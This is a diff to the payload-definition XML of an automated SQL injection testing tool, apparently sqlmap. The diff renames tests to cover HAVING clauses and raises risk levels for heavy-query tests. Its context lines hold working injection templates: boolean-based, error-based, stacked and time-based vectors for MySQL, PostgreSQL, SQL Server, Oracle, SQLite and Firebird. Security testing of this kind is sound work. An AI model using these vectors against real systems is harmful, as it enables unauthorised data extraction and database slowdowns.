@@ -23,7 +23,7 @@ Tag: <boundary>
 
         Valid values:
             0: Always
-            1: WHERE
+            1: WHERE / HAVING
             2: GROUP BY
             3: ORDER BY
             4: LIMIT
@@ -106,7 +106,7 @@ Tag: <test>
 
         Valid values:
             0: Always
-            1: WHERE
+            1: WHERE / HAVING
             2: GROUP BY
             3: ORDER BY
             4: LIMIT
@@ -265,7 +265,7 @@ Formats:
     </boundary>
     <!-- End of generic boundaries -->
 
-    <!-- WHERE clause boundaries -->
+    <!-- WHERE/HAVING clause boundaries -->
     <boundary>
         <level>1</level>
         <clause>1</clause>
@@ -436,12 +436,12 @@ Formats:
         <prefix>")))</prefix>
         <suffix>AND ((("[RANDSTR]" LIKE "[RANDSTR]</suffix>
     </boundary>
-    <!-- End of WHERE clause boundaries -->
+    <!-- End of WHERE/HAVING clause boundaries -->
 
 
-    <!-- Boolean-based blind tests - WHERE clause -->
+    <!-- Boolean-based blind tests - WHERE/HAVING clause -->
     <test>
-        <title>AND boolean-based blind - WHERE clause</title>
+        <title>AND boolean-based blind - WHERE or HAVING clauses</title>
         <stype>1</stype>
         <level>1</level>
         <risk>1</risk>
@@ -457,7 +457,7 @@ Formats:
     </test>
 
     <test>
-        <title>AND boolean-based blind - WHERE clause (MySQL comment)</title>
+        <title>AND boolean-based blind - WHERE or HAVING clauses (MySQL comment)</title>
         <stype>1</stype>
         <level>4</level>
         <risk>1</risk>
@@ -474,7 +474,7 @@ Formats:
     </test>
 
     <test>
-        <title>AND boolean-based blind - WHERE clause (Generic comment)</title>
+        <title>AND boolean-based blind - WHERE or HAVING clauses (Generic comment)</title>
         <stype>1</stype>
         <level>4</level>
         <risk>1</risk>
@@ -491,7 +491,7 @@ Formats:
     </test>
 
    <test>
-        <title>OR boolean-based blind - WHERE clause</title>
+        <title>OR boolean-based blind - WHERE or HAVING clauses</title>
         <stype>1</stype>
         <level>2</level>
         <risk>3</risk>
@@ -507,7 +507,7 @@ Formats:
     </test>
 
     <test>
-        <title>OR boolean-based blind - WHERE clause (MySQL comment)</title>
+        <title>OR boolean-based blind - WHERE or HAVING clauses (MySQL comment)</title>
         <stype>1</stype>
         <level>3</level>
         <risk>3</risk>
@@ -527,7 +527,7 @@ Formats:
     </test>
 
     <test>
-        <title>OR boolean-based blind - WHERE clause (Generic comment)</title>
+        <title>OR boolean-based blind - WHERE or HAVING clauses (Generic comment)</title>
         <stype>1</stype>
         <level>3</level>
         <risk>3</risk>
@@ -542,7 +542,7 @@ Formats:
             <comparison>OR NOT [RANDNUM]=[RANDNUM1]</comparison>
         </response>
     </test>
-    <!-- End of boolean-based blind tests - WHERE clause -->
+    <!-- End of boolean-based blind tests - WHERE or HAVING clauses -->
 
 
     <!-- Boolean-based blind tests - Parameter replace -->
@@ -771,9 +771,9 @@ Formats:
     <!-- End of boolean-based blind tests - GROUP BY and ORDER BY clauses -->
 
 
-    <!-- Error-based tests - WHERE clause -->
+    <!-- Error-based tests - WHERE or HAVING clauses -->
     <test>
-        <title>MySQL &gt;= 5.0 AND error-based - WHERE clause</title>
+        <title>MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clauses</title>
         <stype>2</stype>
         <level>1</level>
         <risk>0</risk>
@@ -793,7 +793,7 @@ Formats:
     </test>
 
     <test>
-        <title>PostgreSQL AND error-based - WHERE clause</title>
+        <title>PostgreSQL AND error-based - WHERE or HAVING clauses</title>
         <stype>2</stype>
         <level>1</level>
         <risk>0</risk>
@@ -812,7 +812,7 @@ Formats:
     </test>
 
     <test>
-        <title>Microsoft SQL Server/Sybase AND error-based - WHERE clause</title>
+        <title>Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clauses</title>
         <stype>2</stype>
         <level>1</level>
         <risk>0</risk>
@@ -831,7 +831,7 @@ Formats:
     </test>
 
     <test>
-        <title>Microsoft SQL Server/Sybase AND error-based - WHERE clause (IN)</title>
+        <title>Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clauses (IN)</title>
         <stype>2</stype>
         <level>2</level>
         <risk>0</risk>
@@ -850,7 +850,7 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle AND error-based - WHERE clause (XMLType)</title>
+        <title>Oracle AND error-based - WHERE or HAVING clauses (XMLType)</title>
         <stype>2</stype>
         <level>1</level>
         <risk>0</risk>
@@ -869,7 +869,7 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle AND error-based - WHERE clause (utl_inaddr.get_host_address)</title>
+        <title>Oracle AND error-based - WHERE or HAVING clauses (utl_inaddr.get_host_address)</title>
         <stype>2</stype>
         <level>2</level>
         <risk>0</risk>
@@ -889,7 +889,7 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle AND error-based - WHERE clause (ctxsys.drithsx.sn)</title>
+        <title>Oracle AND error-based - WHERE or HAVING clauses (ctxsys.drithsx.sn)</title>
         <stype>2</stype>
         <level>3</level>
         <risk>0</risk>
@@ -908,7 +908,7 @@ Formats:
     </test>
 
     <test>
-        <title>Firebird AND error-based - WHERE clause</title>
+        <title>Firebird AND error-based - WHERE or HAVING clauses</title>
         <stype>2</stype>
         <level>2</level>
         <risk>0</risk>
@@ -927,7 +927,7 @@ Formats:
     </test>
 
     <test>
-        <title>MySQL &gt;= 5.0 OR error-based - WHERE clause</title>
+        <title>MySQL &gt;= 5.0 OR error-based - WHERE or HAVING clauses</title>
         <stype>2</stype>
         <level>2</level>
         <risk>2</risk>
@@ -947,7 +947,7 @@ Formats:
     </test>
 
     <test>
-        <title>MySQL OR error-based - WHERE clause</title>
+        <title>MySQL OR error-based - WHERE or HAVING clauses</title>
         <stype>2</stype>
         <level>2</level>
         <risk>0</risk>
@@ -967,7 +967,7 @@ Formats:
     </test>
 
     <test>
-        <title>PostgreSQL OR error-based - WHERE clause</title>
+        <title>PostgreSQL OR error-based - WHERE or HAVING clauses</title>
         <stype>2</stype>
         <level>2</level>
         <risk>2</risk>
@@ -986,7 +986,7 @@ Formats:
     </test>
 
     <test>
-        <title>Microsoft SQL Server/Sybase OR error-based - WHERE clause</title>
+        <title>Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clauses</title>
         <stype>2</stype>
         <level>2</level>
         <risk>2</risk>
@@ -1005,7 +1005,7 @@ Formats:
     </test>
 
     <test>
-        <title>Microsoft SQL Server/Sybase OR error-based - WHERE clause (IN)</title>
+        <title>Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clauses (IN)</title>
         <stype>2</stype>
         <level>3</level>
         <risk>2</risk>
@@ -1024,7 +1024,7 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle OR error-based - WHERE clause (XMLType)</title>
+        <title>Oracle OR error-based - WHERE or HAVING clauses (XMLType)</title>
         <stype>2</stype>
         <level>2</level>
         <risk>2</risk>
@@ -1043,7 +1043,7 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle OR error-based - WHERE clause (utl_inaddr.get_host_address)</title>
+        <title>Oracle OR error-based - WHERE or HAVING clauses (utl_inaddr.get_host_address)</title>
         <stype>2</stype>
         <level>3</level>
         <risk>2</risk>
@@ -1063,7 +1063,7 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle OR error-based - WHERE clause (ctxsys.drithsx.sn)</title>
+        <title>Oracle OR error-based - WHERE or HAVING clauses (ctxsys.drithsx.sn)</title>
         <stype>2</stype>
         <level>4</level>
         <risk>2</risk>
@@ -1082,7 +1082,7 @@ Formats:
     </test>
 
     <test>
-        <title>Firebird OR error-based - WHERE clause</title>
+        <title>Firebird OR error-based - WHERE or HAVING clauses</title>
         <stype>2</stype>
         <level>3</level>
         <risk>2</risk>
@@ -1103,7 +1103,7 @@ Formats:
          TODO: if possible, add payload for SQLite, Microsoft Access,
          and SAP MaxDB - no known techniques at this time
     -->
-    <!-- End of error-based tests - WHERE clause -->
+    <!-- End of error-based tests - WHERE or HAVING clauses -->
 
 
     <!-- Error-based tests - Parameter replace -->
@@ -1315,7 +1315,7 @@ Formats:
         <title>MySQL &lt; 5.0.12 stacked queries (heavy query)</title>
         <stype>4</stype>
         <level>2</level>
-        <risk>0</risk>
+        <risk>2</risk>
         <clause>0</clause>
         <where>1</where>
         <vector>; IF(([INFERENCE]), BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]')), [RANDNUM]);</vector>
@@ -1356,7 +1356,7 @@ Formats:
         <title>PostgreSQL stacked queries (heavy query)</title>
         <stype>4</stype>
         <level>2</level>
-        <risk>0</risk>
+        <risk>2</risk>
         <clause>0</clause>
         <where>1</where>
         <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1, [SLEEPTIME]000000)) ELSE [RANDNUM] END);</vector>
@@ -1438,7 +1438,7 @@ Formats:
         <title>Oracle stacked queries (heavy query)</title>
         <stype>4</stype>
         <level>5</level>
-        <risk>0</risk>
+        <risk>2</risk>
         <clause>0</clause>
         <where>1</where>
         <vector>; SELECT CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2, ALL_USERS T3, ALL_USERS T4, ALL_USERS T5) ELSE [RANDNUM] END FROM DUAL;</vector>
@@ -1498,7 +1498,7 @@ Formats:
         <title>SQLite &gt; 2.0 stacked queries (heavy query)</title>
         <stype>4</stype>
         <level>3</level>
-        <risk>0</risk>
+        <risk>2</risk>
         <clause>0</clause>
         <where>1</where>
         <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB([SLEEPTIME]0000000))))) ELSE [RANDNUM] END);</vector>
@@ -1519,7 +1519,7 @@ Formats:
         <title>Firebird stacked queries (heavy query)</title>
         <stype>4</stype>
         <level>3</level>
-        <risk>0</risk>
+        <risk>2</risk>
         <clause>0</clause>
         <where>1</where>
         <vector>; SELECT IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1, RDB$TYPES AS T2, RDB$COLLATIONS AS T3),[RANDNUM]) FROM RDB$DATABASE;</vector>
@@ -1585,7 +1585,7 @@ Formats:
         <title>MySQL &lt; 5.0.12 AND time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>2</level>
-        <risk>1</risk>
+        <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
         <vector>AND [RANDNUM]=IF(([INFERENCE]), BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]')), [RANDNUM])</vector>
@@ -1604,7 +1604,7 @@ Formats:
         <title>MySQL &lt; 5.0.12 AND time-based blind (heavy query - comment)</title>
         <stype>5</stype>
         <level>5</level>
-        <risk>1</risk>
+        <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
         <vector>AND [RANDNUM]=IF(([INFERENCE]), BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]')), [RANDNUM])</vector>
@@ -1665,7 +1665,7 @@ Formats:
         <title>PostgreSQL AND time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>3</level>
-        <risk>1</risk>
+        <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
         <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1, [SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
@@ -1684,7 +1684,7 @@ Formats:
         <title>PostgreSQL AND time-based blind (heavy query - comment)</title>
         <stype>5</stype>
         <level>5</level>
-        <risk>1</risk>
+        <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
         <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1, [SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
@@ -1701,7 +1701,7 @@ Formats:
     </test>
 
     <test>
-        <title>Microsoft SQL Server/Sybase AND time-based blind</title>
+        <title>Microsoft SQL Server/Sybase time-based blind</title>
         <stype>5</stype>
         <level>1</level>
         <risk>0</risk>
@@ -1724,7 +1724,7 @@ Formats:
         <title>Microsoft SQL Server/Sybase AND time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>2</level>
-        <risk>1</risk>
+        <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
         <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7) ELSE [RANDNUM] END)</vector>
@@ -1743,7 +1743,7 @@ Formats:
         <title>Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)</title>
         <stype>5</stype>
         <level>5</level>
-        <risk>1</risk>
+        <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
         <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7) ELSE [RANDNUM] END)</vector>
@@ -1802,7 +1802,7 @@ Formats:
         <title>Oracle AND time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>2</level>
-        <risk>1</risk>
+        <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
         <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2, ALL_USERS T3, ALL_USERS T4, ALL_USERS T5) ELSE [RANDNUM] END)</vector>
@@ -1821,7 +1821,7 @@ Formats:
         <title>Oracle AND time-based blind (heavy query - comment)</title>
         <stype>5</stype>
         <level>5</level>
-        <risk>1</risk>
+        <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
         <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2, ALL_USERS T3, ALL_USERS T4, ALL_USERS T5) ELSE [RANDNUM] END)</vector>
@@ -1841,7 +1841,7 @@ Formats:
         <title>SQLite &gt; 2.0 AND time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>3</level>
-        <risk>1</risk>
+        <risk>2</risk>
         <clause>1</clause>
         <where>1</where>
         <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB([SLEEPTIME]0000000))))) ELSE [RANDNUM] END)</vector>
@@ -1861,7 +1861,7 @@ Formats:
         <title>SQLite &gt; 2.0 AND time-based blind (heavy query - comment)</title>
         <stype>5</stype>
         <level>5</level>
-        <risk>1</risk>
+        <risk>2</risk>
         <clause>1</clause>
         <where>1</where>
         <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB([SLEEPTIME]0000000))))) ELSE [RANDNUM] END)</vector>
@@ -1882,7 +1882,7 @@ Formats:
         <title>Firebird AND time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>4</level>
-        <risk>1</risk>
+        <risk>2</risk>
         <clause>1</clause>
         <where>1</where>
         <vector>AND [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1, RDB$TYPES AS T2, RDB$COLLATIONS AS T3),[RANDNUM])</vector>
@@ -1902,7 +1902,7 @@ Formats:
         <title>Firebird AND time-based blind (heavy query - comment)</title>
         <stype>5</stype>
         <level>5</level>
-        <risk>1</risk>
+        <risk>2</risk>
         <clause>1</clause>
         <where>1</where>
         <vector>AND [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1, RDB$TYPES AS T2, RDB$COLLATIONS AS T3),[RANDNUM])</vector>
@@ -2103,7 +2103,7 @@ Formats:
 
     <!-- UNION query tests -->
     <test>
-        <title>MySQL NULL UNION query - [COLSTART] to [COLSTOP] columns</title>
+        <title>MySQL UNION query ([CHAR]) - [COLSTART] to [COLSTOP] columns</title>
         <stype>3</stype>
         <level>1</level>
         <risk>1</risk>
@@ -2125,7 +2125,7 @@ Formats:
     </test>
 
     <test>
-        <title>MySQL NULL UNION query - 1 to 3 columns</title>
+        <title>MySQL UNION query ([CHAR]) - 1 to 3 columns</title>
         <stype>3</stype>
         <level>1</level>
         <risk>1</risk>
@@ -2147,7 +2147,7 @@ Formats:
     </test>
 
     <test>
-        <title>MySQL NULL UNION query - 4 to 7 columns</title>
+        <title>MySQL UNION query ([CHAR]) - 4 to 7 columns</title>
         <stype>3</stype>
         <level>2</level>
         <risk>1</risk>
@@ -2169,7 +2169,7 @@ Formats:
     </test>
 
     <test>
-        <title>MySQL NULL UNION query - 8 to 12 columns</title>
+        <title>MySQL UNION query ([CHAR]) - 8 to 12 columns</title>
         <stype>3</stype>
         <level>3</level>
         <risk>1</risk>
@@ -2191,7 +2191,7 @@ Formats:
     </test>
 
     <test>
-        <title>MySQL NULL UNION query - 13 to 18 columns</title>
+        <title>MySQL UNION query ([CHAR]) - 13 to 18 columns</title>
         <stype>3</stype>
         <level>4</level>
         <risk>1</risk>
@@ -2213,7 +2213,7 @@ Formats:
     </test>
 
     <test>
-        <title>MySQL NULL UNION query - 19 to 25 columns</title>
+        <title>MySQL UNION query ([CHAR]) - 19 to 25 columns</title>
         <stype>3</stype>
         <level>5</level>
         <risk>1</risk>
@@ -2235,7 +2235,7 @@ Formats:
     </test>
 
     <test>
-        <title>Generic NULL UNION query - [COLSTART] to [COLSTOP] columns</title>
+        <title>Generic UNION query ([CHAR]) - [COLSTART] to [COLSTOP] columns</title>
         <stype>3</stype>
         <level>1</level>
         <risk>1</risk>
@@ -2254,7 +2254,7 @@ Formats:
     </test>
 
     <test>
-        <title>Generic NULL UNION query - 1 to 3 columns</title>
+        <title>Generic UNION query ([CHAR]) - 1 to 3 columns</title>
         <stype>3</stype>
         <level>1</level>
         <risk>1</risk>
@@ -2273,7 +2273,7 @@ Formats:
     </test>
 
     <test>
-        <title>Generic NULL UNION query - 4 to 7 columns</title>
+        <title>Generic UNION query ([CHAR]) - 4 to 7 columns</title>
         <stype>3</stype>
         <level>2</level>
         <risk>1</risk>
@@ -2292,7 +2292,7 @@ Formats:
     </test>
 
     <test>
-        <title>Generic NULL UNION query - 8 to 12 columns</title>
+        <title>Generic UNION query ([CHAR]) - 8 to 12 columns</title>
         <stype>3</stype>
         <level>3</level>
         <risk>1</risk>
@@ -2311,7 +2311,7 @@ Formats:
     </test>
 
     <test>
-        <title>Generic NULL UNION query - 13 to 18 columns</title>
+        <title>Generic UNION query ([CHAR]) - 13 to 18 columns</title>
         <stype>3</stype>
         <level>4</level>
         <risk>1</risk>
@@ -2330,7 +2330,7 @@ Formats:
     </test>
 
     <test>
-        <title>Generic NULL UNION query - 19 to 25 columns</title>
+        <title>Generic UNION query ([CHAR]) - 19 to 25 columns</title>
         <stype>3</stype>
         <level>5</level>
         <risk>1</risk>
